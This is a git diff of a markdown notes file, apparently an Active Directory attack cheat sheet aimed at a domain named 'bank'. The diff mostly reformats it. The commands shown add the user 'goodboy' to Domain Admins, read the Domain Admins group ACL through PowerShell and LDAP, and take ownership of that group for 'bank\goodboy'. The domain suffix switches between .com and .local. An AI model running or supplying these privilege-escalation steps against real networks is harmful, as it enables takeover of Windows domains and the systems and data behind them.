@@ -15,29 +15,33 @@ net group "domain admins" goodboy /add /domain
 ```
 
 ------------------------------------------------------------------------------------------------------------
-# Import the AD module (requires RSAT or AD PowerShell tools)
+## Import the AD module (requires RSAT or AD PowerShell tools)
 ```bash
 Import-Module ActiveDirectory
 ```
-# Now try the command again
+## Now try the command again
+
 ```bash
 $acl = Get-Acl "AD:\CN=Domain Admins,CN=Users,DC=bank,DC=com"
 ```
-
 --------------------------------------------------------------------------------------------------------
+```bash
 $groupDN = "LDAP://CN=Domain Admins,CN=Users,DC=bank,DC=com"
 
 $acl = [System.DirectoryServices.DirectoryEntry]::new($groupDN).ObjectSecurity
-
+```
 ------------------------------------------------------------------------------------------------------------
-# Create the AD: drive if missing
+## Create the AD: drive if missing
+```bash
 New-PSDrive -Name AD -PSProvider ActiveDirectory -Root "" -Server "bank.com"
+```
+## Now get ACL
 
-# Now get ACL
+```bash
 $acl = Get-Acl "AD:\CN=Domain Admins,CN=Users,DC=bank,DC=com"
-
+```
 ---------------------------------------------------------------------
-# 1. Take ownership
+## 1. Take ownership
 $group = [ADSI]"LDAP://CN=Domain Admins,CN=Users,DC=bank,DC=local"
 
 $group.psbase.ObjectSecurity.SetOwner([System.Security.Principal.NTAccount]("bank\goodboy"))
